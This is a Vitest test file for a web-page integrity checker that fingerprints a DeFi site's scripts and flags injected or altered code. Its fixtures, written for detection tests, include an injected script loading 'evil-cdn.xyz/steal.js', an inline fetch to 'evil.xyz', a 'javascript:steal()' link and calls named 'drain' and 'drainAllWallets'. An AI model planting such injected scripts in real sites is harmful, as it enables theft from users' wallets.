import { describe, expect, it } from "vitest";
import { compareFingerprint, decideStatus, extractScripts, fingerprintPage, parseFingerprint } from "../src/lib/sitecheck";

const BASE = "https://app.protocol.fi/";
const page = (extra = "") => `<html><head>
<script src="/assets/app.js"></script>
<script src="https://cdn.protocol.fi/chart.js"></script>
<script>window.config = {a: 1};</script>${extra}
</head><body></body></html>`;

const files: Record<string, string> = {
  "https://app.protocol.fi/assets/app.js": "console.log('app');",
  "https://cdn.protocol.fi/chart.js": "console.log('chart');",
};
const fetcher = (over: Record<string, string> = {}) => async (u: string) => {
  const all = { ...files, ...over };
  if (!(u in all)) throw new Error("404");
  return all[u];
};

describe("extractScripts", () => {
  it("finds external and inline scripts and resolves relative urls", () => {
    const { scripts } = extractScripts(page(), BASE);
    expect(scripts.map((s) => s.src ?? "inline")).toEqual([
      "https://app.protocol.fi/assets/app.js",
      "https://cdn.protocol.fi/chart.js",
      "inline",
    ]);
  });
  it("flags inline event handlers and javascript: links", () => {
    const { flags } = extractScripts('<a href="javascript:steal()">x</a><button onclick="x()">y</button>', BASE);
    expect(flags).toHaveLength(2);
  });
});

describe("fingerprint and compare", () => {
  it("matches an unchanged page, ignoring whitespace-only edits", async () => {
    const base = await fingerprintPage(page(), BASE, fetcher());
    const again = await fingerprintPage(page(), BASE, fetcher({ "https://app.protocol.fi/assets/app.js": "console.log('app');  \n" }));
    const c = compareFingerprint(base, again);
    expect(c.verdict).toBe("match");
    expect(decideStatus(c, again).status).toBe("Ok");
  });

  it("flags a changed script as Compromised", async () => {
    const base = await fingerprintPage(page(), BASE, fetcher());
    const bad = await fingerprintPage(page(), BASE, fetcher({ "https://app.protocol.fi/assets/app.js": "drain();" }));
    const c = compareFingerprint(base, bad);
    expect(c.verdict).toBe("mismatch");
    expect(c.changed).toContain("https://app.protocol.fi/assets/app.js");
    expect(decideStatus(c, bad).status).toBe("Compromised");
  });

  it("flags an injected third-party script and names the foreign origin", async () => {
    const base = await fingerprintPage(page(), BASE, fetcher());
    const evilPage = page('<script src="https://evil-cdn.xyz/steal.js"></script>');
    const bad = await fingerprintPage(evilPage, BASE, fetcher({ "https://evil-cdn.xyz/steal.js": "x" }));
    const c = compareFingerprint(base, bad);
    expect(c.foreignOrigins).toEqual(["https://evil-cdn.xyz"]);
    const d = decideStatus(c, bad);
    expect(d.status).toBe("Compromised");
    expect(d.note).toContain("evil-cdn.xyz");
  });

  it("flags an injected inline script", async () => {
    const base = await fingerprintPage(page(), BASE, fetcher());
    const bad = await fingerprintPage(page("<script>drain()</script>"), BASE, fetcher());
    const c = compareFingerprint(base, bad);
    expect(c.verdict).toBe("mismatch");
    expect(decideStatus(c, bad).status).toBe("Compromised");
  });

  it("treats a new same-origin file as a redeploy (Degraded), not an attack", async () => {
    const base = await fingerprintPage(page(), BASE, fetcher());
    const redeployed = page().replace("/assets/app.js", "/assets/app.v2.js");
    const next = await fingerprintPage(redeployed, BASE, fetcher({ "https://app.protocol.fi/assets/app.v2.js": "console.log('app2');" }));
    const d = decideStatus(compareFingerprint(base, next), next);
    expect(d.status).toBe("Degraded");
    expect(d.note).toContain("publish a new fingerprint");
  });

  it("reports Degraded when only a script went missing", async () => {
    const base = await fingerprintPage(page(), BASE, fetcher());
    const less = await fingerprintPage(page().replace('<script src="https://cdn.protocol.fi/chart.js"></script>', ""), BASE, fetcher());
    const c = compareFingerprint(base, less);
    expect(c.removed).toHaveLength(1);
    expect(decideStatus(c, less).status).toBe("Degraded");
  });

  it("is 'unset' with no baseline and never raises an alarm", async () => {
    const now = await fingerprintPage(page(), BASE, fetcher());
    const c = compareFingerprint(null, now);
    expect(c.verdict).toBe("unset");
    expect(decideStatus(c, now).status).toBe("Ok");
  });

  it("parseFingerprint rejects junk", () => {
    expect(parseFingerprint("")).toBeNull();
    expect(parseFingerprint("{oops")).toBeNull();
    expect(parseFingerprint('{"v":2}')).toBeNull();
    expect(parseFingerprint('{"v":1,"scripts":{},"flags":[]}')).not.toBeNull();
  });
});

describe("real-world noise vs real changes", () => {
  const cf = (r: string, t: string) =>
    `<html><script>(function(){var d=document.createElement('script');d.innerHTML="window.__CF$cv$params={r:'${r}',t:'${t}'};";document.head.appendChild(d)})();</script></html>`;

  it("ignores per-request tokens inside an inline snippet", async () => {
    const a = await fingerprintPage(cf("a582b9cb293f45c8", "MTc5NDI4MDgyMy4wMDAwMDA="), BASE, fetcher());
    const b = await fingerprintPage(cf("a582b9cc8ce045c8", "MTc5NDI4MDgyNC4wMDAwMDA="), BASE, fetcher());
    expect(compareFingerprint(a, b).verdict).toBe("match");
  });

  it("still catches a change to the inline code itself", async () => {
    const a = await fingerprintPage(cf("a582b9cb293f45c8", "MTc5NDI4MDgyMy4wMDAwMDA="), BASE, fetcher());
    const evil = cf("a582b9cb293f45c8", "MTc5NDI4MDgyMy4wMDAwMDA=").replace("document.head.appendChild(d)", "document.head.appendChild(d);fetch('https://evil.xyz/x')");
    const b = await fingerprintPage(evil, BASE, fetcher());
    const c = compareFingerprint(a, b);
    expect(c.verdict).toBe("mismatch");
    expect(decideStatus(c, b).status).toBe("Compromised");
  });

  it("does not fingerprint JSON data blocks, but does fingerprint module and plain scripts", () => {
    const html = `<script id="__NEXT_DATA__" type="application/json">{"a":1}</script><script type="application/ld+json">{}</script><script type="module" src="/m.js"></script><script>run()</script>`;
    const { scripts } = extractScripts(html, BASE);
    expect(scripts.map((s) => s.src ?? "inline")).toEqual(["https://app.protocol.fi/m.js", "inline"]);
  });
});

describe("short volatile tokens", () => {
  it("ignores a short base64 timestamp but keeps ordinary identifiers meaningful", async () => {
    const mk = (t: string, fn: string) => `<script>var x={t:'${t}'};document.createElement('script');${fn}();</script>`;
    const a = await fingerprintPage(mk("MTc5NDI4OTQ1OA==", "go"), BASE, fetcher());
    const b = await fingerprintPage(mk("MTc5NDI4OTQ1OQ==", "go"), BASE, fetcher());
    expect(compareFingerprint(a, b).verdict).toBe("match");
    const c = await fingerprintPage(mk("MTc5NDI4OTQ1OQ==", "drainAllWallets"), BASE, fetcher());
    expect(compareFingerprint(a, c).verdict).toBe("mismatch");
  });
});
